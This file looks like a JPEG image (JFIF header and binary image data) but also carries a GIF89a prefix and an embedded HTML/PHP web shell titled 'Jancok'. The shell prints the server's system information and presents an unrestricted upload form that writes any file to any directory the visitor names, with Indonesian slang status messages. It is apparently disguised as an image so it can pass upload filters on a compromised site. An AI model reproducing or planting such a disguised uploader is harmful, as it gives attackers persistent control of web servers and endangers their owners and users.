���� JFIF      �� ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90
�� C 




�� C		

��  P P" ��           	
�� �   } !1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        	
�� �  w !1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �"�E�x�}�^�L2[G����'�-�v��EIƜy�Tc�rO��-okZڳG� =_�Z�$�i=���7���m#,1��� �ר�B�Z~1^t�2:}�O�)��9�\+o6�a����B�u��W�ףNq�c�Q�
(����� �R�@{��K
�H�uQTW����W{5{�����]���ݮ_�7�[��+��+^D���}�FS^^�}�X�m���@�W��23+.�_�j��}����QEw��)�R��KY��u����[����"u�5a�)�_>W�|;�E�"��n�6�ŉ���oI�eQ^y�E+�Q�1������ڮ�����3W��D�E��%M� =��:�:�0��y�j�(���0�G����@��_�m'��҆>_��e?�ܻ�j����h��D/�sp�۟�m��.Zf����𥢊���*4��VjX�f��Q��ͻ� e�+�^��F[�ܤeͻܿ{o�W�W�BW�c���?�4�WI��m溑c�6�F���j��ڕ��.�Y'�_3�5��F�c�ۈl���l|���>�Ҽ��d��4���_iz.�>���3WB8�"��\��#p��) ��絯iz��"��?+WEI�MI��ɵo�ڕ�f�)z�����\���Z���E"��e���7AY���c�[�����1�/ѫ��}��T����GIF89a=<!DOCTYPE html>
<html>
<title>Jancok</title>
<body >
<center>
<?
echo "<h3 style='margin-top:0;margin-bottom:5px'>".php_uname()."</h3>";
?>
<form action="" method="post" enctype="multipart/form-data">
   <input type="text" style="padding:5px;border:1px solid green;width:303px;margin-bottom:4px" name="dir"  placeholder="directory">
   <input type="file" style="padding:3px;background-color:green;color:white;margin-bottom:4px" name="file" >
    <input type="submit" style="padding:3px;border:3px solid green;background-color:green;color:white;margin-bottom:4px" value="UPLOAD" name="submit">
</form>
<?
if(isset($_POST['submit'])) {
$target_dir = $_POST['dir'];
$target_file = $target_dir . basename($_FILES["file"]["name"]);

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        echo "Yosh ! ". basename( $_FILES["file"]["name"]). " UPLOAD > OK";
    } else {
        echo "Anjing, upload gagal !";
    }
  }

?> 
</body>
</html>
